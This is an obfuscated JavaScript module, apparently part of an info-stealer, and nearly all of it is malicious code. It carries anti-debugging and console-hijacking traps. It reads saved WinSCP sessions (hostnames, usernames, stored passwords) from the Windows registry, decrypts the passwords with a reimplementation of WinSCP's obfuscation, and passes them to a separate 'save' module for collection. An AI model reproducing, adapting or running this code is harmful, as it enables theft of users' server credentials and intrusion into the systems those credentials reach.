const _0x10e779 = (function () {
  let _0x24de33 = true
  return function (_0x397fdf, _0x2a8944) {
    const _0x1c6357 = _0x24de33
      ? function () {
          if (_0x2a8944) {
            const _0x35d1bb = _0x2a8944.apply(_0x397fdf, arguments)
            return (_0x2a8944 = null), _0x35d1bb
          }
        }
      : function () {}
    return (_0x24de33 = false), _0x1c6357
  }
})()
const _0x378980 = _0x10e779(this, function () {
  return _0x378980
    .toString()
    .search('(((.+)+)+)+$')
    .toString()
    .constructor(_0x378980)
    .search('(((.+)+)+)+$')
})
_0x378980()
const _0x505624 = (function () {
  let _0xa17143 = true
  return function (_0x4ca4ac, _0x3809a3) {
    const _0x217b29 = _0xa17143
      ? function () {
          if (_0x3809a3) {
            const _0x3ea8b7 = _0x3809a3.apply(_0x4ca4ac, arguments)
            return (_0x3809a3 = null), _0x3ea8b7
          }
        }
      : function () {}
    return (_0xa17143 = false), _0x217b29
  }
})()
;(function () {
  _0x505624(this, function () {
    const _0x453696 = new RegExp('function *\\( *\\)'),
      _0x5c8699 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x1ee3d7 = _0x481004('init')
    !_0x453696.test(_0x1ee3d7 + 'chain') || !_0x5c8699.test(_0x1ee3d7 + 'input')
      ? _0x1ee3d7('0')
      : _0x481004()
  })()
})()
const _0x517fb7 = (function () {
    let _0x44ca68 = true
    return function (_0x246bbb, _0x4b22e5) {
      const _0x193e36 = _0x44ca68
        ? function () {
            if (_0x4b22e5) {
              const _0x22e020 = _0x4b22e5.apply(_0x246bbb, arguments)
              return (_0x4b22e5 = null), _0x22e020
            }
          }
        : function () {}
      return (_0x44ca68 = false), _0x193e36
    }
  })(),
  _0x2b664e = _0x517fb7(this, function () {
    let _0x1e3237
    try {
      const _0x3286cf = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x1e3237 = _0x3286cf()
    } catch (_0x96d9f8) {
      _0x1e3237 = window
    }
    const _0x1c4098 = (_0x1e3237.console = _0x1e3237.console || {}),
      _0x151781 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x2ab33b = 0; _0x2ab33b < _0x151781.length; _0x2ab33b++) {
      const _0x33a99b = _0x517fb7.constructor.prototype.bind(_0x517fb7),
        _0x39ecf6 = _0x151781[_0x2ab33b],
        _0x31f861 = _0x1c4098[_0x39ecf6] || _0x33a99b
      _0x33a99b['__proto__'] = _0x517fb7.bind(_0x517fb7)
      _0x33a99b.toString = _0x31f861.toString.bind(_0x31f861)
      _0x1c4098[_0x39ecf6] = _0x33a99b
    }
  })
_0x2b664e()
var _0x3cef43 = require('winreg')
const { stat: _0x57a6db } = require('./stats'),
  _0xb29245 = require('./save')
function _0x2fa44c() {
  var _0x5e7910 = []
  function _0x303ca8() {
    if (_0x5e7910.length == 0) {
      return 0
    }
    const _0x558923 = '0123456789ABCDEF'
    var _0x3d0134 = _0x558923.indexOf(_0x5e7910.shift()),
      _0x38620a = _0x558923.indexOf(_0x5e7910.shift())
    return 255 & ~((((_0x3d0134 << 4) + _0x38620a) << 0) ^ 163)
  }
  this.decrypt = function (_0x38c46c, _0x2d77ef, _0x588b21) {
    if (!_0x588b21.match(/[A-F0-9]+/)) {
      return ''
    }
    var _0x56afbf = [],
      _0x4b38cf = [_0x38c46c, _0x2d77ef].join('')
    _0x5e7910 = _0x588b21.split('')
    var _0x338b26 = _0x303ca8(),
      _0x1a793b
    _0x338b26 == 255
      ? (_0x303ca8(), (_0x1a793b = _0x303ca8()))
      : (_0x1a793b = _0x338b26)
    _0x5e7910 = _0x5e7910.slice(_0x303ca8() * 2)
    for (var _0x20ddd2 = 0; _0x20ddd2 < _0x1a793b; _0x20ddd2++) {
      _0x56afbf.push(String.fromCharCode(_0x303ca8()))
    }
    if (_0x338b26 == 255) {
      var _0x4f9642 = _0x56afbf.slice(0, _0x4b38cf.length).join('')
      _0x4f9642 != _0x4b38cf
        ? (_0x56afbf = [])
        : (_0x56afbf = _0x56afbf.slice(_0x4b38cf.length))
    }
    _0x5e7910 = []
    return _0x56afbf.join('')
  }
}
async function _0x1cbc4a(_0x2e0d4c) {
  if (_0x2e0d4c != 'yes') {
    return
  }
  try {
    let _0x48c297 = []
    const _0x2c8ed8 = new _0x3cef43({
        hive: _0x3cef43.HKCU,
        key: '\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions',
      }),
      _0x10fa0c = await new Promise((_0x578bbb, _0x7599fe) => {
        _0x2c8ed8.keyExists((_0xe9c5ee, _0x5d5ba5) => {
          _0xe9c5ee != null && _0x578bbb(false)
          _0x578bbb(_0x5d5ba5)
        })
      })
    if (!_0x10fa0c) {
      return
    }
    const _0x3ecd23 = await new Promise((_0x2e3f58, _0x599032) => {
      _0x2c8ed8.keys((_0x1f108f, _0x55680b) => {
        _0x1f108f != null && _0x2e3f58([])
        _0x2e3f58(_0x55680b)
      })
    })
    if (_0x3ecd23.length == 0) {
      return
    }
    _0x57a6db.AddSysAdmin('WinSCP')
    for (let _0x1669f4 = 0; _0x1669f4 < _0x3ecd23.length; _0x1669f4++) {
      const _0xb0a5d3 = _0x3ecd23[_0x1669f4],
        _0x763931 = new _0x3cef43({
          hive: _0x3cef43.HKCU,
          key: _0xb0a5d3.key,
        }),
        _0x1f48df = await new Promise((_0x345e2b, _0x579335) => {
          _0x763931.get('HostName', (_0x50bea4, _0x87331b) => {
            _0x50bea4 == null && _0x345e2b(_0x87331b.value)
            _0x345e2b('')
          })
        }),
        _0x40d056 = await new Promise((_0x14bf89, _0x4f6192) => {
          _0x763931.get('UserName', (_0x545945, _0x59a6be) => {
            _0x545945 == null && _0x14bf89(_0x59a6be.value)
            _0x14bf89('')
          })
        }),
        _0x59ea27 = await new Promise((_0x415d29, _0x51560f) => {
          _0x763931.get('Password', (_0x27041a, _0x94f2a3) => {
            _0x27041a == null && _0x415d29(_0x94f2a3.value)
            _0x415d29('')
          })
        })
      if (_0x59ea27 != '' && _0x40d056 != '' && _0x1f48df != '') {
        const _0x56c834 = new _0x2fa44c()
        _0x48c297.push({
          username: _0x40d056,
          password: _0x56c834.decrypt(_0x40d056, _0x1f48df, _0x59ea27),
          hostname: _0x1f48df,
        })
      }
    }
    _0xb29245.saveSysAdmin(_0x48c297, 'WinSCP')
  } catch (_0x3bf380) {}
}
module.exports = { NovaSentinelWinSCP: _0x1cbc4a }
function _0x481004(_0x12ce3f) {
  function _0x29c377(_0x47746b) {
    if (typeof _0x47746b === 'string') {
      return function (_0x10b6ee) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x47746b / _0x47746b).length !== 1 || _0x47746b % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x29c377(++_0x47746b)
  }
  try {
    if (_0x12ce3f) {
      return _0x29c377
    } else {
      _0x29c377(0)
    }
  } catch (_0xac1f04) {}
}
